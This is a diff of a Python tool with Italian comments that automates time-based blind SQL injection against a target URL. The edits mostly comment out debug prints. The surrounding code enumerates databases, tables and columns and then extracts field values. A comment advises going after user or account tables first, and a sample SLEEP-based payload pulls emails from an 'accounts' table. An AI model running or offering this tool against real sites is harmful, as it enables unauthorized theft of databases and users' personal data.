@@ -343,7 +343,7 @@ if(method == "GET"):
     sourceUrl = (url.split('?'))[0]
     paramsAndValues = (url.split('?'))[1]
     paramsAndValues = paramsAndValues.split('&')
-    print(paramsAndValues)
+    #print(paramsAndValues)
     url = sourceUrl + "?" + paramsAndValues[0]
     for i in range(1, len(paramsAndValues)):
         url += "&" + paramsAndValues[i]
@@ -360,16 +360,16 @@ else:
     for i in range(0, numParams):
         print("Inserire il valore del parametro " + params[i])
         values.append(input())
-    print(params)
-    print(values)
+    #print(params)
+    #print(values)
     data = dict(zip(params, values))
-    print(data)
+    #print(data)
     injectableParams = []
     for i in range(0, numParams):
         injectableParams.append("FALSE")
 
     ans = requests.post(sourceUrl, data = data)
-    print(ans.elapsed.total_seconds())
+    #print(ans.elapsed.total_seconds())
         
 outFile.write("Url da attaccare " + sourceUrl + " con metodo " + method + "\n")
 dataFile.write("Url da attaccare " + sourceUrl + " con metodo " + method + "\n")
@@ -384,7 +384,7 @@ if(method == "POST"):
     for i in range (0, numParams):
         if(injectableParams[i] == "TRUE"):
             injParam = i
-print(str(injParam) + " " + str(templateIndex))
+#print(str(injParam) + " " + str(templateIndex))
 #Ottengo i nomi dei database
 rows = getRows1("SCHEMA_NAME", "INFORMATION_SCHEMA.SCHEMATA")
 print("Database: " + str(rows))
@@ -430,7 +430,7 @@ for row in range(0, rows):
     outFile.write("Ho ottenuto " + ("".join(table)) + "\n")
     dataFile.write(("".join(table)) + "\n")
     tables.append("".join(table))
-print(tables)
+#print(tables)
 temp = tables.copy()
 #Se le tabelle si chiamano utenti users accounts o altro attacco subito quelle tabelle
 print("Scegliere la tabella da attaccare: (inserire il numero della tabella)")
@@ -458,15 +458,15 @@ for row in range(0, rows):
     outFile.write("Ho ottenuto " + ("".join(field)) + "\n")
     dataFile.write(("".join(field)) + "\n")
     fields.append("".join(field))
-print(fields)
-temp = fields.copy()
-for i in range(0, rows):
-    print(str(i) + " " + temp.pop(0))
+#print(fields)
+#temp = fields.copy()
+#for i in range(0, rows):
+#    print(str(i) + " " + temp.pop(0))
 temp = fields.copy()
 numFields = rows
 #Estraggo i valori dei campi(prima la lunghezza poi il valore)
 for j in range(0, numFields):
-    print(temp)
+    #print(temp)
     field = temp.pop(0)
     print("Estraggo i valori del campo " + field)
     outFile.write("Estraggo i valori del campo " + field + "\n")
@@ -477,7 +477,7 @@ for j in range(0, numFields):
     dataFile.write("Valori: " + str(rows) + "\n")
     fieldValues = []
     for row in range(0, rows):
-        print(str(injParam) + " " + str(templateIndex))
+        #print(str(injParam) + " " + str(templateIndex))
         length = getLength1(field, dbToAttack + "." + tableToAttack, row)
         print("Lunghezza " + str(length) + ", tempo richiesto stimato: " + str(ceil(time * length * log(256))) + " secondi")
         #r=requests.get(url+"' AND IF(ORD(MID((SELECT email FROM accounts LIMIT 0, 1), 1, 1))>96, SLEEP(3), SLEEP(0)) -- -")
@@ -494,8 +494,8 @@ for j in range(0, numFields):
         dataFile.write(("".join(fieldValue)) + "\n")
         fieldValues.append("".join(fieldValue))
     temp2 = fieldValues.copy()
-    for i in range(0, rows):
-        print(str(i) + " " + temp2.pop(0))
+    #for i in range(0, rows):
+    #    print(str(i) + " " + temp2.pop(0))
 outFile.close()
 dataFile.close()
 print("I dati estratti sono stati salvati nel file data.txt\nNel file log.txt sono presenti tutte le istruzioni eseguite per ottenere i dati")
